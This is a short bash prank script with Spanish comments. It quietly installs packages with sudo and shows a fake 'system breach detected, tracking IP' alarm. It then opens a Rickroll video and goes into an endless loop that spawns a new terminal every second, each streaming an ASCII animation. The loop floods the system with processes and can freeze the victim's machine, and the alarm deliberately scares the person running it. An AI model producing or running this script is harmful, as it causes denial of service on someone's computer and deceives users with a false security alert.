#!/bin/bash

# Instalar dependencias necesarias (si no están instaladas)
sudo apt-get update -y > /dev/null 2>&1
sudo apt-get install -y zenity wmctrl curl > /dev/null 2>&1

# Mostrar el mensaje de "breach" en zenity (sin HTML completo, solo texto plano)
zenity --info --text="⚠️ SYSTEM BREACH DETECTED ⚠️\nUnauthorized access detected. Tracking IP address...\nDeploying countermeasures..." --width=400 --height=200 &
wait $!  # Espera a que el mensaje se muestre antes de continuar

# Cambiar tamaño de la terminal (opcional)
resize -s 50 200 2>/dev/null || true

#Abrir el video de youtube en segundo plano
nohup xdg-open "https://youtu.be/dQw4w9WgXcQ" >/dev/null 2>&1 &

wait $!  #Espera a que el enlace se abra antes de continuar

#Esperar un momento antes de ejecutar el curl
sleep 5

#Poner la terminal en pantalla completa
wmctrl -r :ACTIVE: -b toggle,fullscreen

# Ejecutar el curl en la terminal en pantalla completa
curl -s http://ASCII.live/can-you-hear-me &

# Bucle infinito para abrir multiples terminales
while true; do
    #Ejecutar el curl en el bucle
    gnome-terminal -- bash -c "curl -s http://ASCII.live/can-you-hear-me; exec bash" &
    sleep 1 # Tiempo de espera entre cada curl
done

# El script no llegara a esta linea debido al bucle infinito